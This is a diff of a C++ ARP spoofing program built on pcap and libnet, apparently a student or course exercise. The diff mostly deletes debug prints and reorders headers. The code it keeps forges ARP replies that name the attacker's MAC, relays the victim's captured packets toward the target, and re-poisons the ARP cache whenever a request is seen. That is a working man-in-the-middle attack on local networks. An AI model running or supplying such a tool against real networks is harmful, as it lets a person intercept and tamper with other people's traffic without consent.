@@ -1,20 +1,20 @@
-#include "pch.h"
 #include "lihd.h"
 #include <sys/wait.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include "pch.h"
 
-#pragma pack(push, 1)
 struct EthArpPacket final
 {
 	EthHdr eth_;
 	ArpHdr arp_;
 };
 
-#pragma pack(pop)
-
-struct net_info
-{
-	unsigned int ipv4;
-	uint8_t mac[6];
+struct net_info {
+   unsigned int ipv4;
+   uint8_t mac[6];
 };
 
 void usage()
@@ -92,7 +92,6 @@ int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(packet));
 	}
 
-	fprintf(stderr, "3");
 	while (true)
 	{
 		struct pcap_pkthdr *header;
@@ -112,7 +111,6 @@ int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(packet));
 	}
 
-	fprintf(stderr, "2");
 
 	while (true)
 	{
@@ -127,8 +125,6 @@ int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
 		}
 	}
 
-	fprintf(stderr, "1");
-	// 공격 패킷 정의
 	EthArpPacket arp_packet;
 	arp_packet.eth_.dmac_ = sender.mac;
 	arp_packet.eth_.smac_ = attacker.mac;
@@ -149,25 +145,24 @@ int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(packet));
 	}
 
-	fprintf(stderr, "4");
 	while (true)
 	{
 		struct pcap_pkthdr *header;
 		const u_char *re_packet;
 		int res = pcap_next_ex(packet, &header, &re_packet);
-		fprintf(stderr, "8");
+
 		u_char *relay_packet = new u_char[header->len];
 		memcpy(relay_packet, re_packet, header->len);
 		libnet_ethernet_hdr *eth_hdr = (libnet_ethernet_hdr *)re_packet;
 		libnet_ipv4_hdr *ipv4_hdr = (libnet_ipv4_hdr *)(re_packet + 14);
-		fprintf(stderr, "7");
+	
 		if (ipv4_hdr->ip_dst.s_addr == htonl(Ip(target_ip)))
 		{
 			for (int i = 0; i < 6; i++)
 			{
 				relay_packet[i] = target.mac[i];
 			}
-			fprintf(stderr, "5");
+
 			atk = pcap_sendpacket(packet, relay_packet, header->len);
 			if (atk != 0)
 			{
@@ -176,11 +171,9 @@ int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
 		}
 		if ((ntohs(eth_hdr->ether_type) == 0x0806))
 		{
-			fprintf(stderr, "asdsasad");
 			EthArpPacket *tmp_eth = (EthArpPacket *)(re_packet);
 			if (tmp_eth->arp_.tip_ == Ip(htonl(Ip(target_ip))) && (tmp_eth->arp_.op_ == htons(ArpHdr::Request)))
 			{
-				fprintf(stderr, "========");
 				atk = pcap_sendpacket(packet, reinterpret_cast<const u_char *>(&arp_packet), sizeof(EthArpPacket));
 				if (atk != 0)
 				{
@@ -188,7 +181,6 @@ int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
 				}
 			}
 		}
-		fprintf(stderr, "6");
 	}
 
 	pcap_close(packet);
